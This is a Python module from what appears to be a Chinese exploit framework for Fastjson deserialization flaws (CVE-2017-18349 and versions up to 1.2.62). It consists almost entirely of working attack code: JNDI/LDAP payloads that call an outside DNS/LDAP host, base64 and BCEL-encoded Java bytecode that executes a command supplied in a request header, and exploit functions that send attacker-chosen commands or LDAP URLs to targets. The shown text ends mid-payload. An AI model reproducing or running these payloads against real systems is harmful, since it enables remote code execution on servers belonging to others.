#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
from thirdparty import requests
from module.md5 import random_md5
from core.verify import misinformation
import threading
from core.verify import verify
from module import globals
from thirdparty.requests_toolbelt.utils import dump
from module.api.dns import dns_result, dns_request


class Fastjson():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def fastjson_1224_1_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: VER-1224-1"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-18349"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2017-03-15"
        self.vul_info["vul_vers"] = "<= 1.2.24"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Fastjson中的parseObject允许远程攻击者通过精心制作的JSON请求执行任意代码"
        self.vul_info["cre_date"] = "2021-01-20"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json", 'Connection': 'close'}
        md = dns_request()
        dns = md
        data = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://"+dns+"//Exploit",
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        try:
            try:
                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
            except:
                pass
            if dns_result(md):
                self.vul_info["vul_payd"] = "ldap://" + dns + "//Exploit] "
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1224_2_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: VER-1224-2"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-18349"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2017-03-15"
        self.vul_info["vul_vers"] = "<= 1.2.24"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Fastjson中的parseObject允许远程攻击者通过精心制作的JSON请求执行任意代码"
        self.vul_info["cre_date"] = "2021-04-08"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'Testcmd': cmd,
            'Connection': 'close'
        }
        data = {
            "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            "_bytecodes": [
                "yv66vgAAADMA6wEAHnlzb3NlcmlhbC9Qd25lcjk0NDQ5MTgyMDEzMzcwMAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAZUHduZXI5NDQ0OTE4MjAxMzM3MDAuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwA2AQATamF2YS5uaW8uQnl0ZUJ1ZmZlcggAOAEABHdyYXAIADoBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwA8AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwBAAQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABFAEYKAAwARwEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcASQEADWdldFN1cGVyY2xhc3MMAEsALgoADABMAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAE4KAEoATwEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAFEBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUwBUCgBSAFUBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABZAFoKAFgAWwEAEGphdmEvbGFuZy9TdHJpbmcHAF0BAAMoKVYMACMAXwoABABgAQAQamF2YS9sYW5nL1RocmVhZAcAYgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAZABlCgBjAGYBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGgAaQoAYwBqAQAHdGhyZWFkcwgAbAwAQwBECgACAG4BABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBwAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAByAHMKAGMAdAEABGV4ZWMIAHYBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAeAB5CgBeAHoBAARodHRwCAB8AQAGdGFyZ2V0CAB+AQASamF2YS9sYW5nL1J1bm5hYmxlBwCAAQAGdGhpcyQwCACCAQAHaGFuZGxlcggAhAEABmdsb2JhbAgAhgEACnByb2Nlc3NvcnMIAIgBAA5qYXZhL3V0aWwvTGlzdAcAigEABHNpemUBAAMoKUkMAIwAjQsAiwCOAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABZAJALAIsAkQEAA3JlcQgAkwEAC2dldFJlc3BvbnNlCACVAQAJZ2V0SGVhZGVyCACXAQAIVGVzdGVjaG8IAJkBAAdpc0VtcHR5AQADKClaDACbAJwKAF4AnQEACXNldFN0YXR1cwgAnwEACWFkZEhlYWRlcggAoQEAB1Rlc3RjbWQIAKMBAAdvcy5uYW1lCAClAQAQamF2YS9sYW5nL1N5c3RlbQcApwEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKkAqgoAqACrAQALdG9Mb3dlckNhc2UMAK0AcwoAXgCuAQAGd2luZG93CACwAQAHY21kLmV4ZQgAsgEAAi9jCAC0AQAHL2Jpbi9zaAgAtgEAAi1jCAC4AQARamF2YS91dGlsL1NjYW5uZXIHALoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALwBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjAL4KAL0AvwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DADBAMIKAL0AwwEAEWphdmEvbGFuZy9Qcm9jZXNzBwDFAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxwDICgDGAMkBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAywoAuwDMAQACXEEIAM4BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMANAA0QoAuwDSAQAEbmV4dAwA1ABzCgC7ANUBAAhnZXRCeXRlcwEABCgpW0IMANcA2AoAXgDZDAAHAAgKAAIA2wEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMAN0A3goAqADfAQATamF2YS91dGlsL0hhc2h0YWJsZQcA4QEACHRvU3RyaW5nDADjAHMKAOIA5AEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDoCgDpAGAAIQACAOkAAAAAAAMACgAHAAgAAgA+AAABLwAIAAUAAAD2Egq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAI06BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAIAAABoAGsANwAAAGgAsAA9AAEAQgAAABcAA/cAawcAN/cARAcAPf0ARAcABAcADAA/AAAABAABAEEACgBDAEQAAgA+AAAAfgADAAUAAAA/AU0qtgAwTqcAGS0rtgBITacAFqcAADoELbYATU6nAAMtEgSm/+csAaYADLsASlkrtwBQvywEtgBWLCq2AFywAAEACgATABYASgABAEIAAAAlAAb9AAoHAFgHAAwI/wACAAQHAAQHAF4HAFgHAAwAAQcASgkFDQA/AAAABAABAEEAAQAjAF8AAgA+AAADNgAIAA0AAAI/KrcA6gM2BLgAZ7YAaxJtuABvwABxOgUDNgYVBhkFvqICHxkFFQYyOgcZBwGmAAanAgkZB7YAdU4tEne2AHuaAAwtEn22AHuaAAanAe4ZBxJ/uABvTCvBAIGaAAanAdwrEoO4AG8ShbgAbxKHuABvTKcACzoIpwHDpwAAKxKJuABvwACLOgkDNgoVChkJuQCPAQCiAZ4ZCRUKuQCSAgA6CxkLEpS4AG9MK7YAMBKWA70ADLYANSsDvQAEtgAsTSu2ADASmAS9AAxZAxJeU7YANSsEvQAEWQMSmlO2ACzAAF5OLQGlAAottgCemQAGpwBYLLYAMBKgBL0ADFkDsgAeU7YANSwEvQAEWQO7ABpZEQDItwAmU7YALFcstgAwEqIFvQAMWQMSXlNZBBJeU7YANSwFvQAEWQMSmlNZBC1TtgAsVwQ2BCu2ADASmAS9AAxZAxJeU7YANSsEvQAEWQMSpFO2ACzAAF5OLQGlAAottgCemQAGpwCNLLYAMBKgBL0ADFkDsgAeU7YANSwEvQAEWQO7ABpZEQDItwAmU7YALFcSprgArLYArxKxtgB7mQAYBr0AXlkDErNTWQQStVNZBS1TpwAVBr0AXlkDErdTWQQSuVNZBS1TOgwsuwC7WbsAvVkZDLcAwLYAxLYAyrcAzRLPtgDTtgDWtgDauADcBDYELQGlAAottgCemQAIFQSaAAanABAsuADgtgDltgDauADcFQSZAAanAAmECgGn/lwVBJkABqcACYQGAaf937EAAQBfAHAAcwBBAAEAQgAAAN0AGf8AGgAHBwACAAAAAQcAcQEAAPwAFwcAY/8AFwAIBwACAAAHAF4BBwBxAQcAYwAAAv8AEQAIBwACBwAEAAcAXgEHAHEBBwBjAABTBwBBBP8AAgAIBwACBwAEAAcAXgEHAHEBBwBjAAD+AA0ABwCLAf8AYwAMBwACBwAEBwAEBwBeAQcAcQEHAGMABwCLAQcABAAAAvsAVC4C+wBNUQcA5ykLBAIMB/8ABQALBwACBwAEAAcAXgEHAHEBBwBjAAcAiwEAAP8ABwAIBwACAAAAAQcAcQEHAGMAAPoABQA/AAAABAABAEEAAQAFAAAAAgAG"
            ],
            "_name": "lightless",
            "_tfactory": {
            },
            "_outputProperties":{
            }
        }
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["vul_payd"] = data
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [tomcat] [cmd: " + cmd + "]"
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1224_3_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: VER-1224-3"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2017-18349"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2017-03-15"
        self.vul_info["vul_vers"] = "<= 1.2.24"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Fastjson中的parseObject允许远程攻击者通过精心制作的JSON请求执行任意代码"
        self.vul_info["cre_date"] = "2021-04-10"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'cmd': cmd,
            'Connection': 'close'
        }
        data = '{{"@type": "com.alibaba.fastjson.JSONObject","x":{"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}: "x"}'
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["vul_payd"] = data
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [spring] [cmd: " + cmd + "]"
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1247_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: VER-1247"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "null"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2019-07-15"
        self.vul_info["vul_vers"] = "<= 1.2.47"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。"
        self.vul_info["cre_date"] = "2021-01-20"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json", 'Connection': 'close'}
        md = dns_request()
        dns = md
        data = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://"+dns+"//Exploit",
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        try:
            try:
                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
            except:
                pass
            if dns_result(md):
                self.vul_info["vul_payd"] = "ldap://"+dns+"//Exploit] "
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1262_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Fastjson: VER-1262"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_name"] = "Fastjson 反序列化远程代码执行漏洞"
        self.vul_info["vul_numb"] = "null"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2019-10-07"
        self.vul_info["vul_vers"] = "<= 1.2.62"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "官方暂未发布针对此漏洞的修复版本，开启了autoType功能的受影响用户可通过关闭autoType来规避风险" \
                                    "（autoType功能默认关闭），另建议将JDK升级到最新版本。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        md = dns_request()
        dns = md
        data = {
            "@type": "org.apache.xbean.propertyeditor.JndiConverter",
            "AsText": "ldap://" + dns + "//exploit"
        }
        data = json.dumps(data)
        try:
            try:
                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
            except:
                pass
            if dns_result(md):
                self.vul_info["vul_payd"] = "ldap://" + dns + "//Exploit] "
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                verify.scan_print(self.vul_info)
            else:
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def fastjson_1224_1_exp(self, rmi_ldap):
        vul_name = "Fastjson: VER-1224-1"
        data = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": rmi_ldap,
                "autoCommit": True
            }
        }
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            r = "Command Executed Successfully (But No Echo)"
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def fastjson_1224_2_exp(self, cmd):
        vul_name = "Fastjson: VER-1224-2"
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'Testcmd': cmd,
            'Connection': 'close'
        }
        data = {
            "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            "_bytecodes": [
                "yv66vgAAADMA6wEAHnlzb3NlcmlhbC9Qd25lcjk0NDQ5MTgyMDEzMzcwMAcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAZUHduZXI5NDQ0OTE4MjAxMzM3MDAuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwA2AQATamF2YS5uaW8uQnl0ZUJ1ZmZlcggAOAEABHdyYXAIADoBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwA8AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwBAAQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABFAEYKAAwARwEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcASQEADWdldFN1cGVyY2xhc3MMAEsALgoADABMAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAE4KAEoA